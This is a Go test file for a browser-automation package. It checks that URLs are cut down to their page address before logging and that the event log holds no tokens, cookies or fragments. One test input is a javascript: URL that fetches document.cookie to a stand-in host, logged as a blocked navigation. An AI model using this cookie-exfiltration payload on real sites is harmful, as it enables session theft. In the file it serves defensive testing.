package browser

import (
	"bufio"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func readLines(t *testing.T, path string) []eventLine {
	t.Helper()
	f, err := os.Open(path)
	if err != nil {
		t.Fatal(err)
	}
	defer f.Close()
	var out []eventLine
	sc := bufio.NewScanner(f)
	sc.Buffer(make([]byte, 0, 64<<10), 1<<20)
	for sc.Scan() {
		var l eventLine
		if err := json.Unmarshal(sc.Bytes(), &l); err != nil {
			t.Fatalf("a log line is not JSON: %v: %.80s", err, sc.Text())
		}
		out = append(out, l)
	}
	return out
}

func TestBrowser_ReducedAddress_KeepsWhatNamesThePageAndNothingElse(t *testing.T) {
	for raw, want := range map[string]string{
		"about:blank#popup":                   "about:blank",
		"about:srcdoc":                        "about:srcdoc",
		"data:text/html,<p>secret</p>":        "data:",
		"blob:https://jobs.example.test/1?t=": "blob:",
		"file:///srv/page.html?token=abc":     "file:///srv/page.html",
		"/relative?token=abc":                 "",
	} {
		if got := reduceURL(raw); got != want {
			t.Errorf("reduceURL(%q) = %q, want %q", raw, got, want)
		}
	}
}

func TestBrowser_EventLog_URLsAreReducedAndNothingSecretIsLogged(t *testing.T) {
	path := filepath.Join(t.TempDir(), "log.jsonl")
	i, _ := bareInstance(t)
	i.eventFile = newEventFile(path)
	i.logEvent(EventNavigationBlocked, LaneApply, blockedURL("https://jobs.example.test/a?session=secret#x"))
	i.logEvent(EventNavigationBlocked, LaneApply, blockedURL("javascript:fetch('//x/'+document.cookie)"))
	i.logEvent(EventPopupClosed, LaneApply, "https://jobs.example.test/p/1?token=abc#frag")
	got := readLines(t, path)
	want := []string{"https://jobs.example.test/a", "javascript:", "https://jobs.example.test/p/1"}
	for n, w := range want {
		if got[n].Reason != w {
			t.Errorf("line %d reason %q, want %q", n, got[n].Reason, w)
		}
	}
	raw, _ := os.ReadFile(path)
	for _, leak := range []string{"secret", "token=", "cookie", "#"} {
		if strings.Contains(string(raw), leak) {
			t.Errorf("the log holds %q", leak)
		}
	}
}
